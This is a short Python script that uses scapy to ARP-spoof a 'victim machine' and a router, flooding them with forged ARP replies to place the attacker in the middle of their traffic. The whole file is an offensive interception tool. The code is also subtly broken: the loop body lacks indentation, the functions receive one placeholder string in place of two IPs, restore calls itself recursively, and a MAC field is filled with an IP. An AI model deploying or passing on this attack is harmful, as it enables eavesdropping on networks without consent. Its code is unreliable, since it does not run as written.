#!/user/bin/env python
import time

import scapy.all as scapy
import time
import sys

# note may need to change pdst num 192.168.2.254


def getMac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def restore(destination_ip,source_ip):
    destination_mac = getMac(destination_ip)
    source_mac = getMac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,psrc=source_ip, hwsrc=source_ip)
    scapy.send(packet, count=4,verbose=False)
    
    restore("add ip of victim machine and of the router")
    

def spoof(target_ip,spoof_ip):
    target_mac = getMac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

sent_packetsCount = 0

while True:
try:
    spoof("enter ips")
    spoof("enter ips")
    sent_packetsCount = sent_packetsCount + 2
    print("\r[+] " + str(sent_packetsCount)),
    sys.stdout.flush()
    time.sleep(2)
except KeyboardInterrupt:
    print("[+] detected CTRL +C... QUITTING")
    restore("add ip of victim machine and of the router")
    restore("gatewayIP,TARGET_IP")